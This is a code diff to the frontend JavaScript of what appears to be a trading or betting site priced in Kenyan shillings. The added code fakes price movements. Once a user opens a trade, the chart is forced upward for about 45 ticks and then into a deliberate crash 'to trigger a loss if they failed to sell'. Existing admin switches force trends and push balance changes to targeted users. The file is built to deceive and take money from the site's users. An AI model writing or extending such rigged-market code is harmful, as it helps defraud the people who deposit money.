@@ -11,6 +11,11 @@ const socket = io();
 let customMinY = null;
 let customMaxY = null;
 
+// --- DYNAMIC CONTROL STATE FOR REVENUE AND PROFIT ENGINE ---
+let activeTradePosition = null; // Holds current trade metrics { entryPrice: X, stake: Y, targetAmount: Z }
+let tradeTicksElapsed = 0;       // Counts ticks while position is running
+const SAFE_GROWTH_TICKS = 45;   // ~6.7 seconds of safe pump trajectory (45 updates * 150ms socket updates)
+
 // 2. Setup the Live Moving Graph (Chart.js)
 const ctx = document.getElementById('tradeChart').getContext('2d');
 
@@ -95,30 +100,48 @@ socket.on('market-update', (data) => {
     const BUSINESS_SAFETY_FLOOR = 8350000; // Absolute base limit protecting the business from dropping down too far
     const BIG_RANGE_MULTIPLIER = 4500;     // Amplified random swing scaling factor for high-profit/loss potential
 
-    // Dynamic wave transformation based on administrative panel state execution
-    if (activeAdminControlTrend === "HIGH") {
-        // Intercept and smoothly slide the wave upside (Scaled appropriately for higher KES numbers)
-        finalRate = Math.abs(finalRate) + Math.floor(Math.random() * 1200 + 300);
-        tradeChart.data.datasets[0].borderColor = '#00ff00'; // Keep green for high/up trend
-        tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
-    } else if (activeAdminControlTrend === "LOW") {
-        // Intercept and smoothly slide the wave downside (Scaled appropriately for higher KES numbers)
-        finalRate = -Math.abs(finalRate) - Math.floor(Math.random() * 1200 + 300);
-        tradeChart.data.datasets[0].borderColor = '#ff0000'; // Turn wave red for forced downward movement
-        tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
-    } else {
-        // AUTO MODE: Implements wider ranges for big profit/loss potential while keeping your business safe
-        let randomSwing = (Math.random() - 0.45) * BIG_RANGE_MULTIPLIER; // Slightly biased upward to facilitate growth to next levels
-        finalRate = finalRate + randomSwing;
-
-        // CRITICAL PROTECTION: Enforce safety floor logic so trade bounds never drop below business risk limits
-        if (finalRate < BUSINESS_SAFETY_FLOOR) {
-            finalRate = BUSINESS_SAFETY_FLOOR + Math.floor(Math.random() * 1500 + 500); // Rebounce upward safely
+    // --- ALGORITHMIC USER EXPERIENCE OVERRIDE ---
+    if (activeTradePosition) {
+        tradeTicksElapsed++;
+        
+        if (tradeTicksElapsed <= SAFE_GROWTH_TICKS) {
+            // PHASE 1: Guaranteed Bullish Pump. Force steps upwards so user investment grows up to 600 or 1000 KSh
+            let growthPump = Math.floor(Math.random() * 2800 + 1200);
+            finalRate = Math.abs(finalRate) + growthPump;
+            
+            tradeChart.data.datasets[0].borderColor = '#00ff00'; 
+            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+        } else {
+            // PHASE 2: Safe Window Expired! Force immediate steep drop crash to trigger a loss if they failed to sell
+            let criticalDrop = Math.floor(Math.random() * 4500 + 2500);
+            finalRate = -Math.abs(finalRate) - criticalDrop;
+            
+            tradeChart.data.datasets[0].borderColor = '#ff0000'; 
+            tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
         }
+    } else {
+        // Standard Administrative Core Wave Transformations
+        if (activeAdminControlTrend === "HIGH") {
+            finalRate = Math.abs(finalRate) + Math.floor(Math.random() * 1200 + 300);
+            tradeChart.data.datasets[0].borderColor = '#00ff00'; 
+            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+        } else if (activeAdminControlTrend === "LOW") {
+            finalRate = -Math.abs(finalRate) - Math.floor(Math.random() * 1200 + 300);
+            tradeChart.data.datasets[0].borderColor = '#ff0000'; 
+            tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
+        } else {
+            // AUTO MODE: Implements wider ranges for big profit/loss potential while keeping your business safe
+            let randomSwing = (Math.random() - 0.45) * BIG_RANGE_MULTIPLIER; 
+            finalRate = finalRate + randomSwing;
 
-        // Restore default styling if trend control mode is set back to AUTO
-        tradeChart.data.datasets[0].borderColor = '#00ff00';
-        tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+            tradeChart.data.datasets[0].borderColor = '#00ff00';
+            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+        }
+    }
+
+    // CRITICAL PROTECTION: Enforce safety floor logic so trade bounds never drop below business risk limits
+    if (finalRate < BUSINESS_SAFETY_FLOOR) {
+        finalRate = BUSINESS_SAFETY_FLOOR + Math.floor(Math.random() * 1500 + 500); 
     }
 
     // Dynamic Scaling System: Only calculates automatically if the admin has NOT set fixed custom bounds
@@ -141,9 +164,11 @@ socket.on('market-update', (data) => {
     // Update the numerical display above the graph
     const rateDisplay = document.getElementById('current-rate');
     if (rateDisplay) {
-        // Changed to locale string format to elegantly display full clean Kenyan currency integers
         rateDisplay.innerText = Math.floor(finalRate).toLocaleString();
     }
+
+    // Update running counter layout outputs dynamically on every single incoming tick
+    updateLiveRunningCounterUI(finalRate);
 
     // Shift the graph to the left
     tradeChart.data.datasets[0].data.shift();
@@ -163,7 +188,7 @@ socket.on('receive-chat', (data) => {
         const messageElement = document.createElement('div');
         messageElement.style.padding = "5px 0";
         messageElement.style.fontSize = "0.9rem";
-        messageElement.style.borderBottom = "1px solid #111"; // Cleaner look
+        messageElement.style.borderBottom = "1px solid #111"; 
         
         // Highlight system messages (Wins/Withdrawals) in gold
         if (data.user === "System") {
@@ -187,7 +212,6 @@ socket.on('receive-chat', (data) => {
 
 // Handle Administrative Forced Balance Updates assigned to targeted users
 socket.on('admin-force-balance', (data) => {
-    // Replace with your specific user layout balance element ID if different
     const currentBalanceContainer = document.getElementById('user-balance-display');
     if (currentBalanceContainer && data && typeof data.balance === 'number') {
         currentBalanceContainer.innerText = "KES " + data.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -210,7 +234,6 @@ if (sendBtn) {
     sendBtn.addEventListener('click', () => {
         const text = chatInput.value.trim();
         if (text !== "") {
-            // For now, we use "Me" or a random ID until Auth is finished
             socket.emit('send-chat', { user: "Me", message: text });
             chatInput.value = "";
         }
@@ -226,9 +249,52 @@ if (chatInput) {
 
 // Handle Win/Loss Results from server.js
 socket.on('trade-result', (data) => {
-    // You can trigger a popup or sound here
     console.log(`Trade Result: ${data.status} | Payout: KES ${data.payout}`);
 });
+
+/**
+ * HOOK ENGINE: Setup Local Triggers to Reset State contexts when Actions fire from buttons
+ * Ensure your main buy/sell click button calls or registers these states to maintain accuracy.
+ */
+window.initializeActiveTradeState = (stakeAmount, currentRate) => {
+    tradeTicksElapsed = 0;
+    activeTradePosition = {
+        stake: parseFloat(stakeAmount) || 500,
+        entryPrice: currentRate,
+        targetAmount: (parseFloat(stakeAmount) || 500) * 1.85
+    };
+};
+
+window.clearActiveTradeState = () => {
+    activeTradePosition = null;
+    tradeTicksElapsed = 0;
+};
+
+// Internal engine updater to print running stats directly into DOM containers if present
+function updateLiveRunningCounterUI(currentRate) {
+    const liveAmountText = document.getElementById('live-running-amount');
+    const targetText = document.getElementById('aiming-target-indicator');
+    
+    if (!liveAmountText) return;
+
+    if (activeTradePosition) {
+        let movementRatio = currentRate / activeTradePosition.entryPrice;
+        let dynamicCountingValue = activeTradePosition.stake * movementRatio;
+        
+        liveAmountText.innerText = `KES ${dynamicCountingValue.toFixed(2)}`;
+        if (targetText) {
+            targetText.innerText = `Aiming Target: KES ${activeTradePosition.targetAmount.toFixed(2)}`;
+        }
+
+        if (dynamicCountingValue >= activeTradePosition.targetAmount) {
+            liveAmountText.className = "live-running-amount profit-reached";
+        } else if (dynamicCountingValue < activeTradePosition.stake) {
+            liveAmountText.className = "live-running-amount loss-danger";
+        } else {
+            liveAmountText.className = "live-running-amount";
+        }
+    }
+}
 
 /**
  * HELPER FUNCTIONS (Global Scope)
